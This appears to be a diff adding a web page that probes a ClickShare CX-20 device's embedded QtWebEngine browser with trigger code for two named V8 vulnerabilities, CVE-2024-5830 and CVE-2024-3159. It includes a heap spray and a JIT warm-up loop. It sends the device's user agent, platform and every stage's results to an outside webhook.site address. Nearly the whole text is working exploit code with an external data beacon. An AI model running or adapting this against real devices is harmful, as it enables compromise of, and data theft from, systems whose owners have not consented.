@@ -1,0 +1,115 @@
+<html><body><script>
+// CVE-2024-5830 probe + CVE-2024-3159 probe for QtWebEngine 118 aarch64 (ClickShare CX-20)
+const SINK = 'https://webhook.site/ba41f60a-8179-4fb4-8e46-be78a2fe067f';
+const RID = Date.now().toString(36);
+function enc(s){ return encodeURIComponent(String(s).slice(0,180)); }
+function beacon(tag, val){
+  try { fetch(SINK + '?rid=' + RID + '&t=' + enc(tag) + '&v=' + enc(val), {mode:'no-cors'}); } catch(e) {}
+  try { new Image().src = SINK + '?rid=' + RID + '&t=img_' + enc(tag) + '&v=' + enc(val); } catch(e) {}
+}
+function sleep(ms){ return new Promise(function(r){ setTimeout(r, ms); }); }
+
+(async function main(){
+  beacon('start', navigator.userAgent + ' | ' + navigator.platform + ' | cores=' + (navigator.hardwareConcurrency||0));
+  await sleep(100);
+
+  // ---------------- CVE-2024-5830: object transition / clone type confusion ----------------
+  try {
+    var num = 3;
+    var x = {};
+    for (let i = 0; i < num; i++) { x['a' + i] = 1; }
+    var x1 = {};
+    for (let i = 0; i < num; i++) { x1['a' + i] = 1; }
+    x1.prop = 1;
+    x.__defineGetter__("prop", function() {
+      let obj = {};
+      obj.a0 = 1.5;
+      for (let i = 0; i < 1024 + 512; i++) {
+        let tmp = {};
+        tmp.a0 = 1;
+        for (let j = 1; j < num; j++) { tmp['a' + j] = 1; }
+        tmp['p' + i] = 1;
+      }
+      return 4;
+    });
+    x.z = 1;
+    delete x.z;
+    beacon('5830_stage1', 'objects built, keys_x=' + Object.keys(x).join(','));
+    await sleep(100);
+
+    var y = {...x};
+    beacon('5830_stage2', 'cloned, keys_y=' + Object.keys(y).join(',') + ' y.name=' + (typeof y.name));
+    await sleep(100);
+
+    // heap spray of doubles (spray only, no hardcoded fake addrs used in probe)
+    var arr = new Array(256);
+    for (let i = 0; i < 7; i++) {
+      arr[i] = new Array(256);
+      for (let j = 0; j < arr[i].length; j++) { arr[i][j] = 1.1 + i * 0.001 + j * 1e-7; }
+    }
+    beacon('5830_stage3', 'spray done');
+    await sleep(100);
+
+    var z = {};
+    z.__proto__ = y;
+    z.p = 1;
+    var zpv = z.p; // triggers MigrateSlowToFast OOB path
+    beacon('5830_stage4', 'z.p=' + zpv + ' keys_y_after=' + Object.keys(y).join(','));
+    await sleep(150);
+
+    var tn = (typeof y.name);
+    beacon('5830_stage5', 'typeof_y.name=' + tn);
+    await sleep(150);
+    if (tn !== 'undefined') {
+      try {
+        var nm = y.name;
+        beacon('5830_stage6', 'y.name len=' + (nm && nm.length) + ' isArr=' + Array.isArray(nm));
+        await sleep(150);
+      } catch(e) { beacon('5830_stage6_err', e); }
+    }
+  } catch(e) {
+    beacon('5830_err', e && e.message);
+    await sleep(100);
+  }
+
+  // ---------------- CVE-2024-3159: enum cache OOB (hot-loop trigger, no natives) ----------------
+  try {
+    const object1 = {};
+    object1.a = 1;
+    const object2 = {};
+    object2.a = 1;
+    object2.b = 1;
+    const object3 = {};
+    object3.a = 1;
+    object3.b = 1;
+    object3.c = 1;
+    Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
+    const object4 = {};
+    object4.a = 1;
+    object4.b = 1;
+    object4.c = 1;
+    object4.d = 1;
+    for (let key in object3) { }
+    delete object3.d;
+    let escape;
+    function trigger(callback) {
+      for (let key in object2) { callback(); escape = object2[key]; }
+    }
+    // hot loop instead of %OptimizeFunctionOnNextCall
+    for (let it = 0; it < 30000; it++) { trigger(function(){}); }
+    beacon('3159_warm', 'warmed, escape=' + typeof escape);
+    await sleep(100);
+    trigger(function() {
+      object4.c = 1.1;
+      for (let key in object1) { }
+    });
+    beacon('3159_hit', 'triggered, escape=' + typeof escape + ' val=' + escape);
+    await sleep(100);
+  } catch(e) {
+    beacon('3159_err', e && e.message);
+    await sleep(100);
+  }
+
+  beacon('done', 'all probes completed');
+})();
+</script></body></html>
